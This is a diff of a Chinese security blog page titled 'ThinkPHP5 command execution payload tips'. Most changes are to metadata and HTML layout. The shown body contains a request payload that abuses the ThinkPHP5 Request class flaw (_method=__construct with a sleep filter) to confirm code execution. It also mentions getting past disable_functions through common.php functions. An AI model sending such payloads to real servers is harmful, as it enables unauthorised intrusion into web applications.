@@ -7,20 +7,20 @@
   
   <title>Thinkphp5命令执行payload-tips | qzuser &amp; Web &amp;&amp; PWN</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="0x01 前言    Thinkphp5命令执行在启用了disable_functions和禁用assert的情况下怎么获取权限？Thinkphp5 Request类命令执行漏洞详情见：https://blog.csdn.net/qq_29647709/article/details/86307859  0x02  案例1 环境  Thinkcmf5  = 混合Thinkphp5 开发 关闭了报错">
+  <meta name="description" content="0x01 前言    Thinkphp5命令执行在启用了disable_functions和禁用assert的情况下怎么获取权限？ Thinkphp5 Request类命令执行漏洞详情见：https://blog.csdn.net/qq_29647709/article/details/86307859">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Thinkphp5命令执行payload-tips">
 <meta property="og:url" content="https://gmazing.github.io/2019/04/10/Thinkphp-tips/index.html">
 <meta property="og:site_name" content="qzuser &amp; Web &amp;&amp; PWN">
-<meta property="og:description" content="0x01 前言    Thinkphp5命令执行在启用了disable_functions和禁用assert的情况下怎么获取权限？Thinkphp5 Request类命令执行漏洞详情见：https://blog.csdn.net/qq_29647709/article/details/86307859  0x02  案例1 环境  Thinkcmf5  = 混合Thinkphp5 开发 关闭了报错">
+<meta property="og:description" content="0x01 前言    Thinkphp5命令执行在启用了disable_functions和禁用assert的情况下怎么获取权限？ Thinkphp5 Request类命令执行漏洞详情见：https://blog.csdn.net/qq_29647709/article/details/86307859">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://gmazing.github.io/2019/04/10/Thinkphp-tips/E:/blog/source/_posts/Thinkphp-tips/1.png">
 <meta property="og:image" content="https://gmazing.github.io/2019/04/10/Thinkphp-tips/E:/blog/source/_posts/Thinkphp-tips/2.png">
 <meta property="og:image" content="https://gmazing.github.io/2019/04/10/Thinkphp-tips/E:/blog/source/_posts/Thinkphp-tips/3.png">
-<meta property="og:updated_time" content="2019-04-11T06:40:01.510Z">
+<meta property="og:updated_time" content="2019-04-11T06:42:01.383Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Thinkphp5命令执行payload-tips">
-<meta name="twitter:description" content="0x01 前言    Thinkphp5命令执行在启用了disable_functions和禁用assert的情况下怎么获取权限？Thinkphp5 Request类命令执行漏洞详情见：https://blog.csdn.net/qq_29647709/article/details/86307859  0x02  案例1 环境  Thinkcmf5  = 混合Thinkphp5 开发 关闭了报错">
+<meta name="twitter:description" content="0x01 前言    Thinkphp5命令执行在启用了disable_functions和禁用assert的情况下怎么获取权限？ Thinkphp5 Request类命令执行漏洞详情见：https://blog.csdn.net/qq_29647709/article/details/86307859">
 <meta name="twitter:image" content="https://gmazing.github.io/2019/04/10/Thinkphp-tips/E:/blog/source/_posts/Thinkphp-tips/1.png">
   
     <link rel="alternate" href="/atom.xml" title="qzuser &amp; Web &amp;&amp; PWN" type="application/atom+xml">
@@ -101,10 +101,10 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>0x01 前言</p>
-<more>   Thinkphp5命令执行在启用了<em>disable_functions</em>和禁用assert的情况下怎么获取权限？<br><br>Thinkphp5 Request类命令执行漏洞详情见：<a href="https://blog.csdn.net/qq_29647709/article/details/86307859" target="_blank" rel="noopener">https://blog.csdn.net/qq_29647709/article/details/86307859</a><br><br></more>
-
-<p>0x02  <strong>案例1</strong></p>
-<p>环境  Thinkcmf5  = 混合Thinkphp5 开发</p>
+<p>   Thinkphp5命令执行在启用了<em>disable_functions</em>和禁用assert的情况下怎么获取权限？</p>
+<p>Thinkphp5 Request类命令执行漏洞详情见：<a href="https://blog.csdn.net/qq_29647709/article/details/86307859" target="_blank" rel="noopener">https://blog.csdn.net/qq_29647709/article/details/86307859</a></p>
+<a id="more"></a>
+<h2 id="0x02-案例1"><a href="#0x02-案例1" class="headerlink" title="0x02  案例1"></a>0x02  <strong>案例1</strong></h2><p>环境  Thinkcmf5  = 混合Thinkphp5 开发</p>
 <p>关闭了报错的情况下确定漏洞是否存在, sleep 延时5秒</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=sleep&amp;get[]=5</span><br></pre></td></tr></table></figure>
 <p>启用了<em>disable_functions</em>和禁用assert的情况下，寻找 common.php 里面的公共函数搞事情</p>
@@ -137,7 +137,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://gmazing.github.io/2019/04/10/Thinkphp-tips/" data-id="cjuc9wd450002v0055opmvxqi" class="article-share-link">Share</a>
+      <a data-url="https://gmazing.github.io/2019/04/10/Thinkphp-tips/" data-id="cjuc9z1se0000y405ttb4e9v5" class="article-share-link">Share</a>
       
       
     </footer>
